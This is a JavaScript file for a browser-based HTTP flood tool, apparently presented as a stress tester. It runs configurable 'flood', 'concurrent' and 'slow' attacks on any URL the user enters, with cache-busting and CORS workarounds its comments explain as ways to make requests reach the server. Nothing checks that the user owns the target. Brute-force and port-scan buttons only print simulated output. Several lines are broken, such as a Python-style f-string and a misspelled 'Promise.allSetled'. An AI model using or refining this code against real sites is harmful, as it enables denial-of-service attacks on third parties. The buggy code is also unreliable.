
let isRunning = false;
let abortControllers = [];

const statusDiv = document.getElementById('status');
const targetInput = document.getElementById('targetUrl');
const threadsInput = document.getElementById('threads');
const durationInput = document.getElementById('duration');

function log(msg) {
  const time = new Date().toLocaleTimeString();
  statusDiv.textContent = `[${time}] ${msg}\n` + statusDiv.textContent;
  if (statusDiv.textContent.length > 4000) {
    statusDiv.textContent = statusDiv.textContent.substring(0, 4000);
  }
}

function stopAll() {
  isRunning = false;
  abortControllers.forEach(controller => controller.abort());
  abortControllers = [];
  log("🛑 STOP command issued. Flushing pending requests...");
}

// --- WORKER LOGIC (AGGRESSIVE) ---
async function aggressiveRequest(url, id) {
  if (!isRunning) return;
  
  // Add random cache-busting parameter to prevent caching
  const separator = url.includes('?') ? '&' : '?';
  const target = `${url}${separator}sim=${Math.random().toString(36).substring(2)}&id=${id}`;

  const controller = new AbortController();
  abortControllers.push(controller);

  try {
    // CRITICAL CHANGE: Removed 'no-cors'. 
    // We allow CORS errors to happen. The request STILL hits the server even if the browser blocks the response.
    // This forces the browser's network stack to actually process the outbound packet.
    await fetch(target, {
      method: 'GET',
      signal: controller.signal,
      cache: 'no-store', // Force no caching
      headers: {
        'User-Agent': `StressTestBot-${id}`,
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive' // Try to keep connection open for concurrency test
      }
    });
  } catch (error)
 {
    // EXPECTED: CORS errors, Network errors, or Abort errors.
    // The fact that we got an error means the request was attempted.
    if (error.name === 'AbortError') return;
    // Do not log every error to avoid freezing the UI
  }
  
  // CRITICAL CHANGE: Yield to event loop immediately to prevent browser freeze/throttle
  // This allows the browser to actually send the network packets
  await new Promise(resolve => setTimeout(resolve, 0));
}

async function runAttack(type) {
  const url = targetInput.value;
  const threads = parseInt(threadsInput.value);
  const duration = parseInt(durationInput.value);

  if (!url || (!url.startsWith('http://') && !url.startsWith('https://'))) {
    log("❌ Invalid URL. Must start with http:// or https://");
    return;
  }
  if (isRunning) {
    log("❌ Attack already running. Click STOP first.");
    return;
  }

  isRunning = true;
  abortControllers = []; // Reset controllers
  log(`🚀 Starting ${type} attack on ${url}`);
  log(`🔥 Threads: ${threads}, Duration: ${duration}s`);
  log("⚠️ NOTE: If the browser freezes or stops, it is a security feature. Try reducing threads.");

  const startTime = Date.now();
  const endTime = startTime + (duration * 1000);
  let requestCount = 0;

  // Worker function that runs until stopped or time expires
  async function worker(id) {
    while (isRunning && Date.now() < endTime) {
      if (type === 'flood' || type === 'concurrent') {
        await aggressiveRequest(url, id);
        requestCount++;
      } else if (type === 'slow') {
        // Slowloris simulation: Start request, hold, then abort (simulated by delay)
        // Browsers can't do true slowloris, but we can simulate the load
        await new Promise(r => setTimeout(r, 5000)); // Hold for 5s
        requestCount++;
      }
    }
  }

  // Start workers
  const workers = [];
  for (let i = 0; i < threads; i++) {
    workers.push(worker(i));
  }

  // Wait for duration or stop
  await Promise.allSetled(workers);

  if (Date.now() >= endTime) {
    log(`🛑 Attack finished. Total requests attempted: ${requestCount}`);
  } else {
    log(`🛑 Attack stopped by user. Requests attempted: ${requestCount}`);
  }
  isRunning = false;
  abortControllers = [];
}

// --- MENU HANDLERS ---
document.getElementById('btnFlood').addEventListener('click', () => runAttack('flood'));
document.getElementById('btnConcurrent').addEventListener('click', () => runAttack('concurrent'));
document.getElementById('btnSlow').addEventListener('click', () => runAttack('slow'));

document.getElementById('btnBrute').addEventListener('click', () => {
  log("🔓 Brute Force Simulation (Logic Only) started...");
  let count = 0;
  const interval = setInterval(() => {
    count += 1000;
    log(f"... Simulating attempt #{count}");
    if (count >= 50000) {
      clearInterval(interval);
      log("🛑 Simulation limit reached.");
    }
  }, 100);
});

document.getElementById('btnScan').addEventListener('click', () => {
  log("🔍 Port Scan Simulation...");
  log("JavaScript cannot perform raw TCP scans. Simulating results...");
  setTimeout(() => log("Port 80: OPEN (Simulated)"), 500);
  setTimeout(() => log("Port 443: OPEN (Simulated)"), 1000);
  setTimeout(() => log("Port 22: CLOSED", 1500);
});

document.getElementById('btnStop').addEventListener('click', stopAll);

log("System Ready. Enter target URL (e.g., http://localhost:8080).");